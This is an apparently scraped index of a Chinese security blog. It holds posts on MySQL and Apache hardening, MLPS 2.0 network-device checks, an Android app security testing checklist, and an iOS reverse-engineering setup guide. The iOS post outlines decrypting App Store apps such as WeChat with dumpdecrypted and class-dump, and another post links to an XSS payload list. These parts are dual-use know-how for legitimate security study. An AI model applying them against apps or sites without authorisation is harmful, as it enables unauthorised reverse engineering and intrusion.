若返回结果不为OFF，则在/etc/my.cnf配置文件中修改 12[mysqld] local_infile = 0 11 用户权限合理分配执行下面语句，查看各账户和权限分配情况。请根据业务需求进行合理的权限分配，应遵循三权分立原则（分为系统管理员、安全管理员、安全审计员等，并检查系统各用户所属的权限组。如：系统管理员不能进行业务操作、审计操作，审计员不能进行业务操作、系统管理操作，安全员不能进行添加账号操作等） 123select user,host,account_locked from mysql.user;show grants for &apos;user&apos;@&apos;host&apos;;select * from mysql.user where user=&apos;user&apos; and host=&apos;host&apos; \\G; 不能存在特权用户 不存在越权访问情况（绕过访问控制策略） mysql 数据库应当只允许root用户进行访问和管理 others1.其它建议 最小权限原则 1.对于数据库，可以一个数据库用户分配一个数据库 2.对于mysql进程，不得以root用户运行，默认是采用了mysql用户运行。 更改默认开放端口3306 站库分离 2.一些常见语句记录 1234SET GLOBAL default_password_lifetime = 180;#设置全局变量及赋值。INSTALL PLUGIN validate_password SONAME &apos;validate_password.so&apos;;#安装插件，这里是安装配置密码复杂度策略的插件。 3.关于更改数据库用户密码 12345678update user set password=password(&apos;123&apos;) where user=&apos;root&apos; and host=&apos;localhost&apos;;# mysql 5.7以下update mysql.user set authentication_string=PASSWORD(&apos;newpassword&apos;) where user=&apos;username&apos; and host=&apos;localhost&apos;;# mysql 5.7以上alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos;newpassword&apos;;# mysql 8.0以上 其实就是要注意密码的列名是什么，版本不一样，列名不同，可使select * from mysql.user \\G;查看密码的列名。（\\G 即把列数据逐行显示） 4.实验环境 12ubuntu 18.04.1mysql 5.7.30 扩展阅读MySQL 5.7参考手册（官方）","tags":[{"name":"mysql","slug":"mysql","permalink":"https://laoel.github.io/tags/mysql/"}]},{"title":"iOS安全之iOS逆向环境准备","date":"2020-08-24T02:49:02.000Z","path":"2020/08/24/iOS安全之iOS逆向环境准备/","text":"学iOS逆向之前，想必是了解或熟悉了Android逆向或iOS开发。其实iOS逆向跟Android逆向有很多相同点，毕竟是同属于手机操作系统，同属于APP嘛。其它就不多说了，这是第一篇文章，后面会出一个系列，加油！ 测试设备大家都知道苹果的系统是比较封闭的，iOS系统不比Android系统，它不是开源的，目前市面上也没有合适iOS模拟器可以用来代替真机来做测试。不过Mac OSX倒是有黑苹果可以弄。 所需要准备的硬件 一台iPhone或iPad，型号无要求，iOS系统版本在 iOS 11 以上，且能越狱。 一台苹果电脑，MacOS版本在 macOS 10.15 以上。 苹果手机 有测试机且可越狱，nice ! 没有那就去淘。 建议上某宝上买二手9成新的iPad（iPad比iPhone要便宜） 有条件也可以直接买一台新的（京东、苹果官网、苹果实体店等，要确保能越狱） iOS设备中最便宜的型号为iPad（极力推荐），如果是手机建议买iPhone X以上的型号（非硬性要求） 必须满足iOS系统版本在 iOS 11 以上，且能越狱（硬性要求） 苹果电脑 苹果电脑，已经有那就最好了，没有可以买（不建议买二手的，推荐买台当下最新款的mbp） 不买又没有，那我们上黑苹果 ๑乛◡乛๑ VMware 安装黑苹果 所需材料 a. MacOS系统固件（cdr的后缀名，推荐安装macOS Catalina的最新版本） https://blog.csdn.net/qq_41855420/article/details/102750055 https://apps.apple.com/cn/app/macos-catalina/id1466841314 b. VMware虚拟机（推荐安装最新版） https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html c. Unlocker（解锁文件） https://github.com/theJaxon/unlocker 账户很多人嫌麻烦测试时喜欢填自己主要在用的信息（手机号、账户、个人信息 等），建议去弄个小号，测试的跟自己在用的东西分开。 测试专用的苹果账户1，中国地区的。（注册需要手机号跟邮箱账号，可以用小号的） 测试专用的苹果账户2，非中国地区的，美国（最好是这个）、德国 等等。（这个百度去查怎么get一个非中国地区的苹果账户） 有条件的，可以弄个苹果开发者账号 工具（重要:欢迎补充更新，此表会持续更新建议收藏）需要安装的工具，我简单列了一个表，欢迎各位大佬来补充更新。 工具怎么安装和使用，就不说了。 【腾讯文档】iOS逆向工具集-v1.0https://docs.qq.com/sheet/DTmlwWE5Geklxc0pu 抓包测试工具呢，自己查资料怎么安装和怎么使用。都弄好之后，可以做一个小测试，比如抓App Store这个APP的包，如果能抓到说明相关工具都安装到位了（之前还要安装burp证书，在iOS设备上）。这个就自己测试了。 一个简单逆向实例（砸壳）这里可以拿微信当做目标，去dump它的头文件。 基本上可以参考我以前写过的一篇文章，这个也是自己去测试了。 找APP的沙盒目录除了用cycript，还可以用 filza这个APP，大致思路 是 把编译好的dumpdecrypted.dylib文件传到目标APP的沙盒目录，然后砸壳，砸壳过程可能需要点时间，再生成的.decrypted文件传到电脑上，用class-dump去dump出头文件。 App Store里的应用dump不出头文件来？？- XiaoYue97 https://bbs.ichunqiu.com/thread-29210-1-1.html iOS 逆向: dumpdecrypted 砸壳记 - veryitman（这篇说的更详细一点） http://www.veryitman.com/2018/06/07/iOS-%E9%80%86%E5%90%91-dumpdecrypted-%E7%A0%B8%E5%A3%B3%E8%AE%B0/ 坑：现在 dumpdecrypted编译后还需要加签名，不然会导致后续砸壳失败，需要一个苹果开发者账号（个人版一年99美元，O(∩_∩)O哈哈~） 所以我们尝试用其它工具去砸壳，或者想办法得到一个编译及签名好的dumpdecrypted。 这里定一个小挑战吧，大家可以去试试砸壳，然后写篇技术文章或笔记。 文章内容就是 iOS各种砸壳方法 （标题请自拟） 本文不讲实操部分喔，各种东西可以上百度了解了解。 ٩(๑❛︶❛๑)۶ 学习方法 看书籍（不仅仅是看逆向的，还有开发和编程的） 看视频（可能免费的资料会很少、可以看看收费的或国外的） 看文章（各大论坛和公众号、国内的和国外的） 多交流（去找大佬和跟自己技术差不多的人探讨问题） 多练手（实战，钻研） 多写写（学习笔记、遇到的问题、技术文章） 学习资源（重要:欢迎补充更新，此表会持续更新建议收藏）同样简单列了一个表，欢迎各位大佬来补充更新。 【腾讯文档】iOS逆向学习资源小记https://docs.qq.com/sheet/DTkx3S2xLclVITm1D 最后安利一首歌，超好听，歌名：绝世舞姬","tags":[{"name":"iOS逆向","slug":"iOS逆向","permalink":"https://laoel.github.io/tags/iOS逆向/"},{"name":"移动安全","slug":"移动安全","permalink":"https://laoel.github.io/tags/移动安全/"}]},{"title":"XSS-Payload","date":"2020-08-04T12:38:42.000Z","path":"2020/08/04/XSS-Payload/","text":"https://laoel.github.io/aoe/xss-payload.txt","tags":[{"name":"Payload","slug":"Payload","permalink":"https://laoel.github.io/tags/Payload/"},{"name":"XSS","slug":"XSS","permalink":"https://laoel.github.io/tags/XSS/"}]},{"title":"安全圈里的公众号推荐","date":"2020-06-30T22:57:40.000Z","path":"2020/07/01/安全圈里的公众号推荐/","text":"下面是我个人了解一些质量比较好的微信公众号，推荐大家关注，也欢迎补充（请自行去微信搜索公众号名称点击关注）。 综合型安全社区 FreeBuf 安全客 看雪学院 吾爱破解论坛 偏向培训方面 i春秋 合天智汇 行长叠报 HACK学习呀 安全祖师爷 安全团队 腾讯玄武实验室 猎户攻防实验室 Ms08067安全实验室 WhlTECat安全团队 Tide安全团队 ChaMd5安全团队 酒仙桥六号部队 玄魂工作室 星盟安全 国科漏斗社区 个人（有特色）的安全公众号 信安之路 Bypass 安全小飞侠 君哥的体历 浅黑科技 Android逆向编码美丽 iOS逆向iOS安全论坛 CTFXCTF联赛 物联网物联网IOT安全 工控安全湘雪尘奕 威努特工控安全 等级保护天億网络安全 网络安全等级保护测评中心 天帷等保 湖南金盾评估中心 浙江东安检测技术有限公司 威胁情报腾讯安全威胁情报中心 黑鸟 ThreatPage全球威胁情报","tags":[{"name":"公众号","slug":"公众号","permalink":"https://laoel.github.io/tags/公众号/"},{"name":"安全圈","slug":"安全圈","permalink":"https://laoel.github.io/tags/安全圈/"}]},{"title":"Apache安全加固","date":"2020-04-28T09:42:38.000Z","path":"2020/04/28/Apache安全加固/","text":"实验环境 12345root@NF:~# apache2 -versionServer version: Apache/2.4.29 (Ubuntu)Server built: 2020-03-13T12:26:16root@NF:~# cat /etc/issueUbuntu 18.04.3 LTS \\n \\l 关注官网更新公告https://httpd.apache.org/security_report.html 以最小权限运行Apache进程注意：本环境下的Apache默认就是以www-data用户运行，默认符合要求。 根据需要，为 Apache 服务创建用户及用户组。如果没有设置用户和组，则新建用户，并在 Apache 配置文件中进行指定。 创建 Apache 用户组。 groupadd apache 创建 Apache 用户并加入 Apache 用户组。 useradd apache –g apache 将下面两行设置参数加入 Apache 配置文件 apache2.conf 中： 12User apacheGroup apache 检查 apache2.conf 配置文件中是否允许使用非专用账户（如 root 用户）运行 Apache 服务。 默认设置一般即符合要求。Linux 系统中默认使用 apache 或者 nobody 用户，Unix 系统默认使用 daemon 用户。 加固作用： 以最小权限运行中间件服务，即使网站被getshell，也能减少影响程度。 扩展阅读： 查看和修改运行 Apache 的用户与用户组 - 荒原之梦 linux 下修改 apache 启动的所属用户和组 - 天涯雪 apache2为什么有多个进程？ - muru 禁用目录浏览功能编辑配置文件apache2.conf，指定网站根目录添加Options FollowSymLinks参数。 12345&lt;Directory /var/www/html&gt; Options FollowSymLinks AllowOverride None Require all granted&lt;/Directory&gt; 若要启用目录浏览功能，则是Options Indexes FollowSymLinks，同样禁止目录浏览功能除了删除Indexes也可以在前面加个减号，即Options -Indexes FollowSymLinks来表示。 加固作用： 不展示目录结构信息，防止敏感文件泄露。 扩展阅读： Apache Options Indexes FollowSymLinks详解 - callie AllowOverride参数详解 - upupw Apache的Order Allow,Deny 详解 - 与时俱进 Apache2.4使用require指令进行访问控制 - leoyu 启用日志审计apache2默认启用了错误日志和访问日志的记录，可看配置文件apache.conf有无以下内容。 12345678ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.logLogLevel warnLogFormat &quot;%v:%p %h %l %u %t \\&quot;%r\\&quot; %&gt;s %O \\&quot;%&#123;Referer&#125;i\\&quot; \\&quot;%&#123;User-Agent&#125;i\\&quot;&quot; vhost_combinedLogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %O \\&quot;%&#123;Referer&#125;i\\&quot; \\&quot;%&#123;User-Agent&#125;i\\&quot;&quot; combinedLogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %O&quot; commonLogFormat &quot;%&#123;Referer&#125;i -&gt; %U&quot; refererLogFormat &quot;%&#123;User-agent&#125;i&quot; agent apache默认日志路径：/var/log/apache2 一条标准的访问日志内容如下： 1192.168.56.1 - - [30/Mar/2020:16:34:56 +0800] &quot;GET /test/index.php HTTP/1.1&quot; 200 277 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot; 格式 含义 %h 远端主机（访问网站的客户端地址） %l 远端登录名，用了短横代替 %u 远端用户名，用了短横代替 %t 时间，包括访问的日期、时间、时区 %r 请求起始行，包括请求方法、访问的文件路径 %&gt;s HTTP状态码 %O 响应包数据大小，单位是字节 %{Referer}i\\ 来源 %{User-Agent}i\\ 远端主机浏览器的UA信息 加固作用： 记录访问信息，提供溯源证据。 帮助开发者排查问题。 扩展阅读： Apache日志详解 - long9617 限制特定目录文件执行权限编辑配置文件apache2.conf，根据业务需求添加下面内容。 123456&lt;Directory &quot;/var/www/html/upload&quot;&gt; &lt;FilesMatch &quot;\\.(php|php3)$&quot;&gt; Order allow,deny Deny from all &lt;/FilesMatch&gt;&lt;/Directory&gt; 加固作用： 通过禁止访问来阻止一些非法文件的执行（恶意攻击者通过任意文件上传漏洞，往往会上传一些可执行文件，如木马文件，从而拿到webshell）。 扩展阅读： apache禁止访问文件或目录执行权限、禁止运行脚本PHP文件的设置方法(转) 自定义错误页面编辑配置文件apache2.conf，添加下面内容 123ErrorDocument 403 /custom403.htmlErrorDocument 404 /custom404.htmlErrorDocument 500 /custom500.html 其中customxxx.html为要设置的错误页面，需提前写好放网站根目录下。 1234root@NF:~# ls -lah /var/www/html/ | grep html-rw-r--r-- 1 ubuntu ubuntu 688 1月 19 15:00 403.html-rw-r--r-- 1 ubuntu ubuntu 685 1月 19 14:57 404.html-rw-r--r-- 1 ubuntu ubuntu 665 1月 19 15:01 500.html 加固作用： 防止默认报错页面泄露一些敏感信息（开发框架、数据库语句、物理路径、内网IP等）。 扩展阅读： APACHE_自定义404错误页面 - epsilon1 隐藏Apache版本号编辑配置文件apache2.conf，添加下面内容 12ServerSignature OffServerTokens Prod 加固作用： 防止中间件版本信息泄露。 限制和允许特定IP访问编辑配置文件apache2.conf，添加下面内容。 若使用IP白名单，则根据业务需求添加下面内容 12345678&lt;Directory &quot;/var/www/html/test&quot;&gt; Options All AllowOverride None Order Deny,Allow Deny From all Allow From 192.168.1.0/24 192.168.3.0/24 Allow From 127.0.0.1&lt;/Directory&gt; 若使用IP黑名单，则根据业务需求添加下面内容 1234567&lt;Directory &quot;/var/www/html/test&quot;&gt; Options All AllowOverride None Order Deny,Allow Deny From 192.168.1.0/24 192.168.3.0/24 Deny From 192.168.56.1&lt;/Directory&gt; 加固作用： 使访问受控。 扩展阅读： Apache中限制和允许特定IP访问 - we will rock you 扩展阅读http://httpd.apache.org/docs/current/zh-cn/ https://blog.51cto.com/ww123/1639424 https://www.cnblogs.com/xiaozi/p/10117715.html https://www.jianshu.com/p/a8bab3f50c7b https://bbs.ichunqiu.com/thread-35736-1-1.html http://www.defvul.com/apache/ https://www.alibabacloud.com/help/zh/faq-detail/52981.htm https://blog.csdn.net/my98800/article/details/51740389 小彩蛋各位大佬有空能不能帮我投个票，有账号的直接投（还有两天） 没有注册过的，用手机号注册一个账号（先领个VIP再投）账号注册地址https://user.ichunqiu.com/?u=RAFnx93Zfg0Ai7uBqVi3suaXELRRE1xp&amp;type=1 投票地址https://www.ichunqiu.com/20201111 一个账号每天 可以投3票（11号晚上截止，还有两天）新注册账号可以领24小时VIP（可以投两次6票的）感谢","tags":[{"name":"apache","slug":"apache","permalink":"https://laoel.github.io/tags/apache/"},{"name":"加固","slug":"加固","permalink":"https://laoel.github.io/tags/加固/"},{"name":"中间件","slug":"中间件","permalink":"https://laoel.github.io/tags/中间件/"}]},{"title":"等保2.0-安全通信网络","date":"2020-03-16T09:44:39.000Z","path":"2020/03/16/等保2-0-安全通信网络/","text":"网络架构a）应保证网络设备的业务处理能力满足业务高峰期需要； 访谈是否有过因设备性能问题导致的宕机情况。 看主要网络设备的CPU使用率和内存使用率（一段时间内），要求使用率峰值不大于70%。 123456789101112131415Ciscoshow memory//查看内存使用情况show cpu//查看CPU使用率show resource usage all//查看会话连接数情况（可选）HUAWEI/H3Cdisplay memory//查看内存使用情况display cpu-usage//查看CPU使用率display session statistics//查看会话连接数情况（可选） 显示设备的内存统计信息。 http://www.h3c.com/cn/d_201206/747196_30005_0.htm#_Toc326217683 1234567&lt;Sysname&gt; display memoryThe statistics about memory is measured in KB：Slot 1: totl used free shared buffers cachedMem: 2019300 318600 1700700 0 0 84500-/+ buffers/cache: 234100 1785200Swap: 0 0 0 显示当前CPU利用率统计信息。 http://www.h3c.com/cn/d_201009/692184_30005_0.htm#_Toc271212291 12345&lt;Sysname&gt; display cpu-usageUint CPU usage: 14% in last 5 seconds 12% in last 1 minute 8% in last 5 minutes 显示所有的会话统计信息。 http://www.h3c.com/cn/d_201809/1112432_30005_0.htm#_Toc524423106 12345678910111213141516171819202122232425&lt;Sysname&gt; display session statisticsCurrent session(s):593951 Current TCP session(s): 0 Half-Open: 0 Half-Close: 0 Current UDP session(s): 593951 Current ICMP session(s): 0 Current RAWIP session(s): 0Current relation table(s): 50000Session establishment rate: 184503/s TCP Session establishment rate: 0/s UDP Session establishment rate: 184503/s ICMP Session establishment rate: 0/s RAWIP Session establishment rate: 0/sReceived TCP: 1538 packet(s) 337567 byte(s)Received UDP: 86810494849 packet(s) 4340524910260 byte(s)Received ICMP: 307232 packet(s) 17206268 byte(s)Received RAWIP: 0 packet(s) 0 byte(s)Dropped TCP: 0 packet(s) 0 byte(s)Dropped UDP: 0 packet(s) 0 byte(s)Dropped ICMP: 0 packet(s) 0 byte(s)Dropped RAWIP: 0 packet(s) 0 byte(s) b）应保证网络各个部分的带宽满足业务高峰期需要； 访谈链路带宽是多少MB，是否有过网络带宽瓶颈的事件发生。 查看主要网络设备的接口流量状况，要求占用宽带值不大于80%。 1234567891011121314Ciscoshow interface Ethernet x/x/x (关键上/下连端口号）//查看端口工作信息，判断端口的流量状况，算法：(int+out bit/1024*/1000(如端口带宽为1000mb/s)*100%HUAWEI/H3Cdisplay interface brief//查所有接口情况display interface GigabitEthernet x/x/x(关键上/下连端口号）//查看端口流量信息(选择关键出口)，判断端口的流量状况。算法：int+out bytes/1024*/125(如端口带宽为1000Mb/s)*100%■ Peak value of input(接口输入流量的峰值速率大小，单位为bytes/sec)■ Peak value of output(接口输出流量的峰值速率大小，单位为bytes/sec)1MB＝1024Kb＝1024*1024B（bytes） 1Mbps=0.125MB/S 显示所有接口的概要信息。 http://www.h3c.com/cn/d_201206/747151_30005_0.htm#_Toc326217530 123456789101112131415161718192021222324252627282930&lt;Sysname&gt; display interface briefThe brief information of interface(s) under route mode:Link: ADM - administratively down; Stby - standbyProtocol: (s) - spoofingInterface Link Protocol Main IP DescriptionLoop1 UP UP(s) -- oneM-GE0/0/0 UP UP 192.168.0.61NULL0 UP UP(s) --REG0 DOWN DOWN --Vlan1 DOWN DOWN -- The brief information of interface(s) under bridge mode:Link: ADM - administratively down; Stby - standbySpeed or Duplex: (a)/A - auto; H - half; F - fullType: A - access; T - trunk; H - hybridInterface Link Speed Duplex Type PVID DescriptionBAGG1 DOWN auto A A 1FGE1/0/49 DOWN 40G F A 50FGE1/0/51 DOWN 40G F A 52FGE1/0/52 DOWN 40G F A 53XGE1/0/1 UP 10G(a) F(a)XGE1/0/2 DOWN auto A A 3 lanswitchXGE1/0/3 DOWN auto A A 4XGE1/0/4 DOWN auto A A 5XGE1/0/5 DOWN auto A A 6XGE1/0/6 DOWN auto A A 7XGE1/0/7 DOWN auto A A 8XGE1/0/8 DOWN auto A A 9XGE1/0/9 DOWN auto A A 10 查看设备接口GigabitEthernet 1/0/1的状态信息。 https://support.huawei.com/hedex/pages/EDOC1000154488AZG0822J/07/EDOC1000154488AZG0822J/07/resources/cli/display_interface.html 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;sysname&gt; display interface GigabitEthernet 1/0/1GigabitEthernet1/0/1 current state : UP Line protocol current state : UP GigabitEthernet1/0/1 current firewall zone : trustDescription : Interface Route PortThe Maximum Transmit Unit is 1500 bytes, Hold timer is 10(sec) Internet Address is 10.1.1.1/24 IP Sending Frames' Format is PKTFMT_ETHNT_2, Hardware address is 0022-a106-0e5b Media type is twisted pair, loopback not set, promiscuous mode not set 1000Mb/s-speed mode, full-duplex mode, link type is auto negotiation Max-bandwidth : 1000000 kbps Last physical up time : - Last physical down time : 2015-05-07 20:33:13 Current system time: 2015-05-11 10:08:18 Top 3 input bit rate: 672688 bits/sec at 2018-01-15 11:11:41 20872 bits/sec at 2018-01-15 11:11:40 17456 bits/sec at 2018-01-14 19:23:00 Top 3 output bit rate: 672000 bits/sec at 2018-01-15 11:11:41 19568 bits/sec at 2018-01-15 11:11:40 9064 bits/sec at 2018-01-14 11:11:53 Top 3 input packet rate: 8008 packets/sec at 2018-01-15 11:11:41 248 packets/sec at 2018-01-15 11:11:40 216 packets/sec at 2018-01-14 11:11:56 Top 3 output packet rate: 8000 packets/sec at 2018-01-15 11:11:41 232 packets/sec at 2018-01-15 11:11:40 80 packets/sec at 2018-01-14 11:11:53Last 300 seconds input rate 2619 bytes/sec, 16 packets/sec Last 300 seconds output rate 28627 bytes/sec, 26 packets/sec Input: 623941 bytes, 5743 packets Output: 0 bytes, 0 packets Input: Unicast: 0 packets, Multicast: 2700 packets Broadcast: 3043 packets, JumboOctets: 0 packets CRC: 0 packets, Symbol: 0 packets Overrun: 0 packets, InRangeLength: 0 packets LongPacket: 0 packets, Jabber: 0 packets, Alignment: 0 packets Fragment: 0 packets, Undersized Frame: 0 packets RxPause: 0 packets Output: Unicast: 0 packets, Multicast: 0 packets Broadcast: 0 packets, JumboOctets: 0 packets Lost: 0 packets, Overflow: 0 packets, Underrun: 0 packets System: 0 packets, Overrun: 0 packets TxPause: 0 packets Unknown Vlan: 0 packets Input bandwidth utilization : 0% Output bandwidth utilization : 0% c）应划分不同的网络区域，并按照方便管理和控制的原则为各网络区域分配地址； 看主要网络设备的配置，是否根据一定的原则合理的划分了不同网络区域，并分配了地址，且与网络拓扑图一致。 12345678910111213Ciscosh run//查看设备运行配置，查找相关vlan或interface vlan信息。HUAWEI/H3Cdisplay current-configuration//查看设备当前配置，查找相关vlan或interface vlan信息。display vlan brief//显示设备上所有已创建VLAN的概要信息display interface Vlan-interface brief//显示VLAN接口的相关信息brief：显示接口的概要信息。不指定该参数时，将显示接口的详细信息。 d）应避免将重要网络区域部署在边界处，重要网络区域与其他区域之间应采取可靠的技术隔离手段；e）应提供线路、关键网络设备和关键计算机设备的硬件冗余，保证系统的可用性；f）应按照业务的重要程度分配带宽，优先保障重要业务；通信传输a）应采用密码技术保证通信过程中数据的完整性；b）应采用密码技术保证通信过程中数据的保密性；c）应在通信前基于密码技术对通信的双方进行验证或认证；d）应基于硬件密码模块对重要通信过程进行密码运算和密钥管理；可信验证a）可基于可信根对通信设备的系统引导程序、系统程序、重要配置参数和通信应用程序等进行可信验证，并将验证结果形成审计记录送至安全管理中心，并进行动态关联感知；","tags":[{"name":"等保","slug":"等保","permalink":"https://laoel.github.io/tags/等保/"}]},{"title":"Android客户端安全测试指南","date":"2020-01-20T03:02:24.000Z","path":"2020/01/20/Android客户端安全测试指南/","text":"有任何问题可留言评论，另有Excel版提供 https://github.com/laoel/testing-guide/blob/master/02-Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97.xlsx 客户端程序安全Classes.dex文件代码加密混淆保护漏洞级别高/中漏洞描述对客户端程序反编译文件DEX进行转换，查看客户端是否对JAVA源生代码进 行加密混淆，是否能看到清晰的JAVA代码。 漏洞危害程序代码可以被轻松反编译，攻击者可逆向工程分析程序运行原理、漏洞挖掘。修复建议1、对关键代码进行加密混淆。2、使用第三方平台对APK进行加固。 So文件代码加密混淆保护漏洞级别中漏洞描述利用工具反编译 so 文件，查看客户端是否对 C/C++源生代码进行加密混淆。漏洞危害应用程序关键代码明文暴露降低了攻击者入侵和利用的门槛，攻击者或恶意程序可通过修改代码获取关键信息或绕过部分逻辑直接操作。修复建议1、对关键代码进行加密混淆。2、使用第三方平台对APK进行加固。 敏感文件加密保护漏洞级别高/中/低漏洞描述查看客户端中的敏感文件是否加密保存，包括但不限于JavaScript、Lua、Python等脚本代码，xml、ini等关键配置文件，证书文件及开发残留文件。漏洞危害攻击者容易根据明文的敏感文件对APP进行逆向工作，从而还原出APP通信内容、APP的私钥等关键数据。修复建议1、对敏感数据进行加密处理。2、对于不必要的数据不要在本地客户端。 文件完整性校验漏洞级别高漏洞描述检测客户端程序是否对自身完整性进行校验。漏洞危害攻击者能够通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息。修复建议1、建议使用CRC、MD5或者SHA1等算法方式对APK文件进行完整性校验。2、使用第三方平台对APK进行加固。 硬编码安全漏洞级别高漏洞描述在计算机程序或文本编辑中，硬编码是指将可变变量用一个固定值来代替的方法。密钥硬编码在代码中，而根据密钥的用途不同，这导致了不同的安全风险，有的导致加密数据被破解，数据不再保密，有的导致和服务器通信的加签被破解，引发各种血案。漏洞危害导致加密数据被破解。修复建议1、不要使用硬编码。2、应对密码加密存储，并且在外部资源文件中进行处理。 使用不安全的加密算法漏洞级别高漏洞描述检测客户端程序使用的加密算法是否安全可靠。漏洞危害导致加密数据被破解。修复建议使用安全且不易被破解的加密算法。 debug调试属性未关闭漏洞级别低漏洞描述检测客户端程序是否开启debug调试属性。漏洞危害APP可被Java调试工具进行调试，进而获取和篡改用户敏感信息，甚至分析并且修改代码实现的业务逻辑。修复建议将AndroidManifest.xml文件中android:debuggable属性值设为false。 allowBackup备份安全漏洞级别低漏洞描述检测客户端程序是否开启allowBackup备份属性。漏洞危害攻击者可通过adb backup和adb restore对APP的应用数据进行备份和恢复,从而可能获取明文存储的用户敏感信息。修复建议将AndroidManifest.xml文件中android:allowBakup属性值设为false。 应用权限测试漏洞级别中漏洞描述检测客户端程序是否存在敏感权限。漏洞危害APP应用应只拥有所需功能的最小行为权限，多余的行为权限对APP的安全造成危害，同时容易被安全检测工具认定为恶意APP。修复建议请确认APP应用是否需要这些权限，如果不需要，请删除多余的权限。 Activity 界面劫持漏洞级别中漏洞描述检查是否存在Activity界面劫持风险，确认客户端是否能够发现并提示用户存在劫持。漏洞危害Activity界面劫持可以获取用户输入的敏感信息，如账号、密码。修复建议当主activity退到后台后，推送Toast弹框消息提示用户，程序已经进入后台运行。 组件安全Activity组件安全漏洞级别中漏洞描述检测Activity组件是否允许非授权的第三方调用。漏洞危害Activity组件允许非授权的第三方调用可能会引发权限绕过漏洞，攻击者可以未授权获取敏感信息或者进行非法操作。修复建议建议在AndroidManifest.xml中设置所有不允许导出的Activity组件exported属性为false。 Service组件安全漏洞级别中漏洞描述检测Service组件是否允许非授权的第三方调用。漏洞危害Service组件允许非授权的第三方调用可能会引发权限绕过漏洞，攻击者可以未授权获取敏感信息或者进行非法操作。修复建议建议在AndroidManifest.xml中设置所有不允许导出的Service组件exported属性为false。 Broadcast Receiver组件安全漏洞级别中漏洞描述检测Broadcast Receiver组件是否允许非授权的第三方调用。漏洞危害Broadcast Receiver组件允许非授权的第三方调用可能会引发权限绕过漏洞，攻击者可以未授权获取敏感信息或者进行非法操作。修复建议建议在AndroidManifest.xml中设置所有不允许导出的Broadcast Receiver组件exported属性为false。 Content Provider组件安全漏洞级别中漏洞描述检测Content Provider组件是否允许非授权的第三方调用。漏洞危害Content Provider组件允许非授权的第三方调用可能会引发权限绕过漏洞，攻击者可以未授权获取敏感信息或者进行非法操作。修复建议建议在AndroidManifest.xml中设置所有不允许导出的Content Provider组件exported属性为false。 数据安全Shared_Prefs敏感信息保护漏洞级别高/中漏洞描述APP在处理运行时产生的敏感数据（如账号、密码、手机号、Cookie、Token等业务相关敏感信息）时，将未经加密的敏感信息以明文的形式保存在文件或者本地数据库中。漏洞危害当用户手机失窃或者连接到电脑等情况时，这些明文的敏感数据可能被第三方程序获取，导致用户的账号、密码、手势密码、手机号等个人敏感信息容易泄露。修复建议1、使用安全有效的加密算法对敏感信息进行加密保护。2、根据业务需求确定必需在本地存储的数据，不存储非必要的数据。 本地数据库明文存储敏感信息漏洞级别高/中漏洞描述APP在处理运行时产生的敏感数据（如账号、密码、手机号、Cookie、Token等业务相关敏感信息）时，将未经加密的敏感信息以明文的形式保存在本地数据库中。漏洞危害当用户手机失窃或者连接到电脑等情况时，这些明文的敏感数据可能被第三方程序获取，导致用户的账号、密码、手势密码、手机号等个人敏感信息容易泄露。修复建议1、使用安全有效的加密算法对敏感信息进行加密保护。2、根据业务需求确定必需在本地存储的数据，不存储非必要的数据。 Log日志打印敏感信息漏洞级别高/中漏洞描述检测Logcat日志安全性。漏洞危害存在用户个人敏感信息泄露的风险。修复建议在发布程序之前屏蔽掉敏感的Log日志信息，或者使用统一的Log控制类，屏蔽掉所有敏感信息的输出。 应用安全规范使用自带安全软键盘完成敏感输入漏洞级别高漏洞描述检测客户端程序在输入敏感数据时是否使用自带安全软键盘。漏洞危害安卓应用中的输入框默认使用系统软键盘，手机安装木马后，木马可以通过替换系统软键盘，记录手机键盘输过的密码。修复建议使用APP自定义的安全软键盘（而非系统输入法）来输入敏感信息。 敏感界面截屏和录屏保护漏洞级别低漏洞描述检测客户端程序的敏感界面是否可防止屏幕截屏和录屏。漏洞危害录屏和截屏是黑客窃取用户隐私的又一手段，通过对用户敏感界面的截取而窃取用户的登录、支付的信息从而造成客户的损失。修复建议对于APP的业务敏感界面，禁止系统进行截屏和录屏。 应用后台运行模糊处理保护漏洞级别低漏洞描述检测客户端程序后台运行的APP界面是否进行了模糊处理。漏洞危害可能产生一定的信息泄露风险。修复建议后台运行APP时，界面增加模糊处理。 ROOT环境检测漏洞级别中漏洞描述检测客户端程序是否可以在ROOT设备上运行。漏洞危害APP应用应禁止安装在已ROOT的移动设备中，已ROOT的移动设备会对APP应用的安全性造成巨大的影响。修复建议1、禁止APP在ROOT设备上运行。2、若确实需要在ROOT环境中运行，应对用户提出安全警告。 模拟器环境检测漏洞级别低漏洞描述检测客户端程序是否可以在模拟器中运行。漏洞危害攻击者可以通过自己修改定制特定的模拟器来达到监控应用关键函数、获取应用敏感数据，破解应用的目的。修复建议防止APP在模拟机中运行，当监听到处于模拟器时，禁止启动。检测内容，设备 IDS、imsi id，硬件信息，模拟器特有的文件等。 账号安全密码复杂度检测漏洞级别低漏洞描述检测客户端程序是否允许使用弱密码。漏洞危害攻击者可爆破口令，从而可得出正确的口令，冒用其身份进行登录。修复建议建议设置密码复杂度，密码长度8-20位并且由数字、字母或字符组成，至少两种。 单点登录限制漏洞级别低漏洞描述测试一个账号是否可以同时在多个设备上登录APP应用进行操作。漏洞危害攻击者可冒用用户账号登录APP。修复建议若无业务需求，应当限制单点登录。 账号锁定策略检测漏洞级别低漏洞描述检测客户端程序是否限制登录尝试次数。漏洞危害攻击者可以使用穷举法暴力破解账号密码。修复建议设置账号登录失败锁定策略，如登录失败5次锁定账号10分钟。 UI信息泄露漏洞级别低漏洞描述检测客户端程序是否存在敏感信息泄露问题。漏洞危害若用户的手机号、身份证号等敏感信息全部明文显示，易造成用户信息泄露。修复建议1、对用户敏感数据进行脱敏处理。2、统一登录界面的错误回显信息。 